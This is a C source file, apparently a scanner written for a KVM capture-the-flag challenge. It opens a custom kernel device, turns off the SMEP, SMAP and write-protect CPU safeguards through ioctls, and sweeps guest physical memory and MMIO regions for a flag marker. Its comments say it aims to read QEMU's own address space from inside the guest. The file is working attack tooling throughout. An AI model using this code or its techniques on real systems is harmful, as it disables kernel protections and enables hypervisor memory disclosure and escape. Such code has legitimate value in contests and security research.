#define _GNU_SOURCE
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <fcntl.h>
#include <sys/ioctl.h>
#include <stdint.h>
#include <ctype.h>

#define IOCTL_READ_PHYSICAL      0x101E
#define IOCTL_READ_MMIO          0x1003
#define IOCTL_DISABLE_SMEP       0x1015
#define IOCTL_DISABLE_SMAP       0x1016
#define IOCTL_DISABLE_WP         0x1017

#define DEVICE_FILE "/dev/kvm_probe_dev"

/* The magic marker bytes - little endian */
/* 44434241efbeadde = "ABCD" + 0xDEADBEEF */
static unsigned char FLAG_MARKER[] = { 0xde, 0xad, 0xbe, 0xef, 0x41, 0x42, 0x43, 0x44 };
/* Also try reversed */
static unsigned char FLAG_MARKER_REV[] = { 0x44, 0x43, 0x42, 0x41, 0xef, 0xbe, 0xad, 0xde };

struct physical_rw {
    unsigned long phys_addr;
    unsigned long size;
    unsigned char *user_buffer;
};

struct mmio_data {
    unsigned long phys_addr;
    unsigned long size;
    unsigned char *user_buffer;
    unsigned long single_value;
    unsigned int value_size;
};

static int fd = -1;

int init_driver(void) {
    fd = open(DEVICE_FILE, O_RDWR);
    if (fd < 0) {
        perror("Failed to open device");
        return -1;
    }
    ioctl(fd, IOCTL_DISABLE_SMEP, 0);
    ioctl(fd, IOCTL_DISABLE_SMAP, 0);
    ioctl(fd, IOCTL_DISABLE_WP, 0);
    printf("[+] Driver initialized\n");
    return 0;
}

static int read_physical(unsigned long phys_addr, unsigned char *buf, size_t size) {
    struct physical_rw req = { .phys_addr = phys_addr, .size = size, .user_buffer = buf };
    return ioctl(fd, IOCTL_READ_PHYSICAL, &req);
}

static int read_mmio(unsigned long phys_addr, unsigned char *buf, size_t size) {
    struct mmio_data req = { .phys_addr = phys_addr, .size = size, .user_buffer = buf };
    return ioctl(fd, IOCTL_READ_MMIO, &req);
}

static void hexdump(unsigned char *buf, unsigned long addr, size_t size) {
    for (size_t offset = 0; offset < size; offset += 16) {
        printf("0x%lx: ", addr + offset);
        size_t line_size = (offset + 16 <= size) ? 16 : (size - offset);
        for (size_t i = 0; i < 16; i++) {
            if (i < line_size) printf("%02x ", buf[offset + i]);
            else printf("   ");
        }
        printf(" | ");
        for (size_t i = 0; i < line_size; i++) {
            unsigned char c = buf[offset + i];
            printf("%c", (c >= 0x20 && c < 0x7f) ? c : '.');
        }
        printf("\n");
    }
}

static void print_string(unsigned char *buf, size_t max_len) {
    printf("String: \"");
    for (size_t i = 0; i < max_len && buf[i]; i++) {
        if (buf[i] >= 0x20 && buf[i] < 0x7f) printf("%c", buf[i]);
        else if (buf[i] == '\n') printf("\\n");
        else printf("\\x%02x", buf[i]);
    }
    printf("\"\n");
}

/* Search for pattern in buffer */
static unsigned char* find_pattern(unsigned char *buf, size_t buf_len, 
                                    unsigned char *pattern, size_t pattern_len) {
    if (buf_len < pattern_len) return NULL;
    for (size_t i = 0; i <= buf_len - pattern_len; i++) {
        if (memcmp(buf + i, pattern, pattern_len) == 0) {
            return buf + i;
        }
    }
    return NULL;
}

/* Scan physical memory for the flag marker */
void scan_for_marker(unsigned long start, unsigned long end, unsigned long step) {
    printf("\n[*] Scanning physical memory 0x%lx - 0x%lx for flag marker...\n", start, end);
    printf("[*] Marker: ");
    for (int i = 0; i < 8; i++) printf("%02x ", FLAG_MARKER[i]);
    printf("\n[*] Also checking reversed marker\n\n");
    
    unsigned char buf[4096];
    unsigned long addr;
    int found = 0;
    
    for (addr = start; addr < end; addr += step) {
        if (read_physical(addr, buf, 4096) != 0) {
            continue;
        }
        
        /* Search for both marker patterns */
        unsigned char *match = find_pattern(buf, 4096, FLAG_MARKER, 8);
        if (!match) {
            match = find_pattern(buf, 4096, FLAG_MARKER_REV, 8);
        }
        
        /* Also search for "ABCD" alone */
        if (!match) {
            match = find_pattern(buf, 4096, (unsigned char*)"ABCD", 4);
        }
        
        /* Also search for deadbeef */
        if (!match) {
            unsigned char deadbeef[] = { 0xef, 0xbe, 0xad, 0xde };
            match = find_pattern(buf, 4096, deadbeef, 4);
        }
        
        /* Search for common flag patterns */
        if (!match) {
            match = find_pattern(buf, 4096, (unsigned char*)"flag{", 5);
        }
        if (!match) {
            match = find_pattern(buf, 4096, (unsigned char*)"FLAG{", 5);
        }
        if (!match) {
            match = find_pattern(buf, 4096, (unsigned char*)"CTF{", 4);
        }
        
        if (match) {
            size_t offset = match - buf;
            printf("[!!!] MARKER/FLAG FOUND at phys 0x%lx + 0x%lx = 0x%lx\n", 
                   addr, offset, addr + offset);
            
            /* Show context around the match */
            size_t ctx_start = (offset >= 64) ? offset - 64 : 0;
            size_t ctx_end = (offset + 192 < 4096) ? offset + 192 : 4096;
            
            printf("\n[+] Context around match:\n");
            hexdump(buf + ctx_start, addr + ctx_start, ctx_end - ctx_start);
            printf("\n");
            print_string(match, 128);
            printf("\n");
            found++;
            
            if (found >= 10) {
                printf("[*] Found %d matches, stopping...\n", found);
                return;
            }
        }
        
        if ((addr % 0x10000000) == 0 && addr > start) {
            printf("[.] Scanned up to 0x%lx...\n", addr);
        }
    }
    
    if (!found) {
        printf("[-] Marker not found in scanned range\n");
    } else {
        printf("[+] Total matches found: %d\n", found);
    }
}

/* Quick scan specific interesting areas */
void quick_scan(void) {
    printf("\n[*] Quick scan of interesting memory regions...\n\n");
    
    /* Based on the earlier output, these regions had printable content */
    struct {
        unsigned long start;
        unsigned long end;
        const char *name;
    } regions[] = {
        { 0x01000000, 0x02000000, "16-32MB (kernel text area)" },
        { 0x00100000, 0x00200000, "1-2MB (low kernel)" },
        { 0x10000000, 0x20000000, "256-512MB" },
        { 0x40000000, 0x50000000, "1-1.25GB (has QEMU strings!)" },
        { 0x00000000, 0x00100000, "First 1MB" },
        { 0x3f000000, 0x42000000, "Around 1GB boundary" },
        { 0, 0, NULL }
    };
    
    for (int i = 0; regions[i].name; i++) {
        printf("\n=== Scanning %s ===\n", regions[i].name);
        scan_for_marker(regions[i].start, regions[i].end, 4096);
    }
}

/* Scan MMIO regions */
void scan_mmio(void) {
    printf("\n[*] Scanning MMIO regions for marker...\n\n");
    
    unsigned long mmio_regions[] = {
        0xfeb00000, 0xfeb01000, 0xfeb02000, 0xfeb03000,
        0xfea00000, 0xfe000000, 0xfec00000, 0xfed00000, 0xfee00000,
        0
    };
    
    unsigned char buf[4096];
    
    for (int i = 0; mmio_regions[i]; i++) {
        if (read_mmio(mmio_regions[i], buf, 4096) == 0) {
            unsigned char *match = find_pattern(buf, 4096, FLAG_MARKER, 8);
            if (!match) match = find_pattern(buf, 4096, FLAG_MARKER_REV, 8);
            if (!match) match = find_pattern(buf, 4096, (unsigned char*)"flag", 4);
            if (!match) match = find_pattern(buf, 4096, (unsigned char*)"ABCD", 4);
            
            if (match) {
                size_t offset = match - buf;
                printf("[!!!] Found at MMIO 0x%lx + 0x%lx:\n", mmio_regions[i], offset);
                hexdump(buf, mmio_regions[i], 256);
            }
            
            /* Check for any interesting content */
            int printable = 0;
            for (int j = 0; j < 256; j++) {
                if (buf[j] >= 0x20 && buf[j] < 0x7f) printable++;
            }
            if (printable > 50) {
                printf("[?] MMIO 0x%lx has lots of printable content:\n", mmio_regions[i]);
                hexdump(buf, mmio_regions[i], 256);
            }
        }
    }
}

/* Exhaustive search of ALL physical memory */
void full_scan(void) {
    printf("\n[*] FULL SCAN of all physical memory...\n");
    printf("[*] This will take a while!\n\n");
    
    scan_for_marker(0, 0x100000000UL, 4096);  /* First 4GB */
}

/* Targeted scan around the addresses that showed interesting content */
void targeted_scan(void) {
    printf("\n[*] Targeted scan around interesting addresses...\n\n");
    
    /* From the earlier output: 
     * 0x416279a8 had QEMU strings - this is in the QEMU binary/data area
     * This means we might be able to read QEMU's address space!
     */
    
    printf("[*] The address 0x416279a8 had QEMU symbols - scanning around it...\n");
    scan_for_marker(0x41000000, 0x42000000, 4096);
    
    printf("\n[*] Scanning first 64MB thoroughly...\n");
    scan_for_marker(0, 0x4000000, 4096);
}

/* Search by hex pattern input */
void search_hex_pattern(const char *hex_pattern) {
    size_t len = strlen(hex_pattern);
    if (len % 2 != 0) {
        printf("[-] Hex pattern must have even number of characters\n");
        return;
    }
    
    size_t pattern_len = len / 2;
    unsigned char *pattern = malloc(pattern_len);
    
    for (size_t i = 0; i < pattern_len; i++) {
        sscanf(hex_pattern + i*2, "%2hhx", &pattern[i]);
    }
    
    printf("[*] Searching for pattern: ");
    for (size_t i = 0; i < pattern_len; i++) {
        printf("%02x ", pattern[i]);
    }
    printf("\n");
    
    unsigned char buf[4096];
    
    for (unsigned long addr = 0; addr < 0x100000000UL; addr += 4096) {
        if (read_physical(addr, buf, 4096) == 0) {
            unsigned char *match = find_pattern(buf, 4096, pattern, pattern_len);
            if (match) {
                size_t offset = match - buf;
                printf("[!!!] Pattern found at 0x%lx:\n", addr + offset);
                
                size_t ctx_start = (offset >= 64) ? offset - 64 : 0;
                hexdump(buf + ctx_start, addr + ctx_start, 256);
                print_string(match, 128);
            }
        }
        
        if ((addr % 0x10000000) == 0 && addr > 0) {
            printf("[.] Scanned up to 0x%lx...\n", addr);
        }
    }
    
    free(pattern);
}

void print_usage(const char *prog) {
    printf("KVMCTF Flag Marker Scanner\n\n");
    printf("The flag marker is: 44434241efbeadde (ABCD + DEADBEEF)\n\n");
    printf("Usage: %s <command>\n\n", prog);
    printf("Commands:\n");
    printf("  quick       - Quick scan of interesting regions\n");
    printf("  targeted    - Targeted scan around promising areas\n");
    printf("  full        - Full scan of all memory (slow!)\n");
    printf("  mmio        - Scan MMIO regions\n");
    printf("  range <start> <end> - Scan specific range\n");
    printf("  hex <pattern> - Search for specific hex pattern\n");
    printf("  read <addr> <size> - Read and display memory\n");
}

int main(int argc, char *argv[]) {
    if (argc < 2) {
        print_usage(argv[0]);
        return 1;
    }
    
    if (init_driver() < 0) return 1;
    
    if (strcmp(argv[1], "quick") == 0) {
        quick_scan();
    }
    else if (strcmp(argv[1], "targeted") == 0) {
        targeted_scan();
    }
    else if (strcmp(argv[1], "full") == 0) {
        full_scan();
    }
    else if (strcmp(argv[1], "mmio") == 0) {
        scan_mmio();
    }
    else if (strcmp(argv[1], "range") == 0 && argc >= 4) {
        unsigned long start = strtoul(argv[2], NULL, 0);
        unsigned long end = strtoul(argv[3], NULL, 0);
        scan_for_marker(start, end, 4096);
    }
    else if (strcmp(argv[1], "hex") == 0 && argc >= 3) {
        search_hex_pattern(argv[2]);
    }
    else if (strcmp(argv[1], "read") == 0 && argc >= 4) {
        unsigned long addr = strtoul(argv[2], NULL, 0);
        size_t size = strtoul(argv[3], NULL, 0);
        if (size > 4096) size = 4096;
        
        unsigned char *buf = malloc(size);
        if (read_physical(addr, buf, size) == 0) {
            hexdump(buf, addr, size);
            printf("\n");
            print_string(buf, size);
        } else {
            printf("[-] Failed to read from 0x%lx\n", addr);
        }
        free(buf);
    }
    else {
        print_usage(argv[0]);
        return 1;
    }
    
    return 0;
}